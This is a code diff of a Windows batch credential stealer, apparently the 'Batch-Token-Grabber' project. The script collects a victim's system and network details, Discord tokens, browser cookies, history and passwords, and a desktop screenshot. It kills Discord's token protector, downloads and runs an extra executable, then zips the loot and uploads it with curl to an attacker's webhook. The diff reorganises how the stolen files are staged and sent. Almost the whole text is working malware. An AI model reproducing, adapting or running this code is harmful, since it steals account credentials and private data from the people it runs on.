@@ -22,7 +22,7 @@ ipconfig /all >%userprofile%\AppData\Local\Temp\ip.txt
 netstat -an >%userprofile%\AppData\Local\Temp\netstat.txt
 
 ::sends the username, ip, current time, and date of the victim
-curl -X POST -H "Content-type: application/json" --data "{\"content\": \"```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
+curl -X POST -H "Content-type: application/json" --data "{\"content\": \"@everyone ```User = %username%  Ip = %ip% time =  %time% date = %date% os = %os% Computername = %computername% ```\"}" %webhook%
 
 taskkill /im Discord.exe /f
 taskkill /im DiscordTokenProtector.exe /f
@@ -57,23 +57,24 @@ curl -LJO https://github.com/KDot227/Batch-Token-Grabber/releases/download/V1.1/
 start /w main.exe %webhook%
 taskkill /f /im main.exe
 
-echo penis > %localappdata%\Temp\KDot.txt
 
-powershell -Command "Compress-Archive -Path %localappdata%\Temp\KDot.txt -DestinationPath damnKDot.zip; try {Compress-Archive -Path %localappdata%\Temp\tokens.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\browser-cookies.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\browser-history.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\browser-passwords.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\desktop-screenshot.png -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\System_INFO.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\sysi.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\ip.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\netstat.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\programms.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}; try {Compress-Archive -Path %localappdata%\Temp\uuid.txt -Update -DestinationPath damnKDot.zip} catch {Write-Host 'Error'}" && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\damnKDot.zip %webhook%
+mkdir %localappdata%\Temp\KDOT
+echo penis > %localappdata%\Temp\KDOT\KDot.txt
+move %userprofile%\AppData\Local\Temp\tokens.txt %userprofile%\AppData\Local\Temp\KDOT\tokens.txt
+move %localappdata%\Temp\ip.txt %localappdata%\Temp\KDOT\ip.txt
+move %localappdata%\Temp\ipp.txt  %localappdata%\Temp\KDOT\ipp.txt
+move %localappdata%\Temp\sysi.txt %localappdata%\Temp\KDOT\sysi.txt
+move %localappdata%\Temp\System_INFO.txt %localappdata%\Temp\KDOT\System_INFO.txt
+move %localappdata%\Temp\netstat.txt %localappdata%\Temp\KDOT\netstat.txt
+move %localappdata%\Temp\programms.txt %localappdata%\Temp\KDOT\programms.txt
+move %localappdata%\Temp\uuid.txt %localappdata%\Temp\KDOT\uuid.txt
+move %localappdata%\Temp\wlan.txt %localappdata%\Temp\KDOT\wlan.txt
+move %localappdata%\Temo\browser-cookies.txt %localappdata%\Temo\KDOT\browser-cookies.txt
+move %localappdata%\Temp\browser-history.txt %localappdata%\Temp\KDOT\browser-history.txt
+move %localappdata%\Temp\browser-passwords.txt %localappdata%\Temp\KDOT\browser-passwords.txt
+move %localappdata%\Temp\desktop-screenshot.png %localappdata%\Temp\KDOT\desktop-screenshot.png
 
-del %userprofile%\AppData\Local\Temp\tokens.txt
-del %localappdata%\Temp\ip.txt
-del %localappdata%\Temp\ipp.txt
-del %localappdata%\Temp\sysi.txt
-del %localappdata%\Temp\System_INFO.txt
-del %localappdata%\Temp\netstat.txt
-del %localappdata%\Temp\programms.txt
-del %localappdata%\Temp\uuid.txt
+powershell -Command "Compress-Archive -Path %localappdata%\Temp\KDOT -DestinationPath %localappdata%\Temp\KDOT.zip" && curl -i -H 'Expect: application/json' -F file=@%userprofile%\AppData\Local\Temp\KDOT.zip %webhook%
 del %localappdata%\Temp\main.exe
-del %localappdata%\Temp\wlan.txt
-del %localappdata%\Temp\browser-cookies.txt
-del %localappdata%\Temp\browser-history.txt
-del %localappdata%\Temp\browser-passwords.txt
-del %localappdata%\Temp\desktop-screenshot.png
-del %localappdata%\Temp\damnKDot.zip
-del %localappdata%\Temp\KDot.txt
+rmdir %localappdata%\Temp\KDOT
+del KDOT.zip
